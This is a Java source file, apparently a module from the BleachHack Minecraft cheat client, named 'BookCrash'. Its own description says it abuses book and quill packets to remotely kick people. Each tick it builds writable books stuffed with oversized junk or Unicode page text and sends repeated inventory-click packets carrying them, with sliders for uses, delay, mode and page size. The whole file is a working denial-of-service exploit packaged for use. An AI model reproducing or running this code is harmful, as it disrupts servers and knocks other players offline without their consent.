package bleach.hack.module.mods;

import bleach.hack.event.events.EventReadPacket;
import bleach.hack.event.events.EventTick;
import bleach.hack.gui.clickgui.SettingMode;
import bleach.hack.gui.clickgui.SettingSlider;
import bleach.hack.gui.clickgui.SettingToggle;

import com.google.common.eventbus.Subscribe;

import bleach.hack.module.Category;
import bleach.hack.module.Module;
import net.minecraft.client.network.packet.DisconnectS2CPacket;
import net.minecraft.container.SlotActionType;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.server.network.packet.ClickWindowC2SPacket;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

/* Rebranded queueskip exploit. credit > https://www.youtube.com/watch?v=-BA4ABlFJuc */
public class BookCrash extends Module {

    private static String size;
    private int delay = 0;

    public BookCrash() {
        super("BookCrash", -1, Category.EXPLOITS, "Abuses book and quill packets to remotely kick people.",
                new SettingSlider("Uses: ", 1, 20, 5, 0),
                new SettingSlider("Delay: ", 0, 5, 0, 0),
                new SettingMode("Mode: ", "Ascii", "Fill", "Random", "Old"),
                new SettingSlider("Pages: ", 1,100,50,0),
                new SettingSlider("Chars per Page: ", 1,210,210,0),
                new SettingToggle("Auto-Off: ", true));
    }

    @Subscribe
    public void onTick(EventTick event) {
        delay = (delay >= getSettings().get(1).toSlider().getValue() ? 0 : delay + 1);
        if(delay > 0) return;

        ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
        ListTag list = new ListTag();
        CompoundTag tag = new CompoundTag();
        String author = "Bleach";
        String title = "\n Bleachhack Owns All \n";

        int pages = 50;
        int pageChars = 210;
        try { pages = Math.min((int) getSettings().get(3).toSlider().getValue(), 100); } catch(Exception e) {}
        try { pageChars = Math.min((int) getSettings().get(4).toSlider().getValue(), 210); } catch(Exception e) {}
        if (getSettings().get(2).toMode().mode == 2) {
            IntStream chars = new Random().ints(0x80, 0x10FFFF - 0x800).map(i -> i < 0xd800 ? i : i + 0x800);
            size = chars.limit(pageChars*pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
        }else if (getSettings().get(2).toMode().mode == 1) {
            size = repeat(pages * pageChars, String.valueOf(0x10FFFF));
        }else if (getSettings().get(2).toMode().mode == 0) {
            IntStream chars = new Random().ints(0x20, 0x7E);
            size = chars.limit(pageChars*pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
        }else if (getSettings().get(2).toMode().mode == 3) {
            size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        }
        
        for (int i = 0; i < 50; i++) {
            String siteContent = size;
            StringTag tString = new StringTag(siteContent);
            list.add(tString);
        }

        tag.putString("author", author);
        tag.putString("title", title);
        tag.put("pages", list);

        bookObj.putSubTag("pages", list);
        bookObj.setTag(tag);

        for(int i = 0; i < getSettings().get(0).toSlider().getValue(); i++) {
            mc.player.networkHandler.sendPacket(new ClickWindowC2SPacket(0, 0, 0, SlotActionType.PICKUP, bookObj, (short) 0));
        }
    }
    
    private static String repeat(int count, String with) {
        return new String(new char[count]).replace("\0", with);
    }
    
    @Subscribe
    private void EventDisconnect(EventReadPacket event) {
        if (event.getPacket() instanceof DisconnectS2CPacket && getSettings().get(5).toToggle().state) setToggled(false);
    }
}
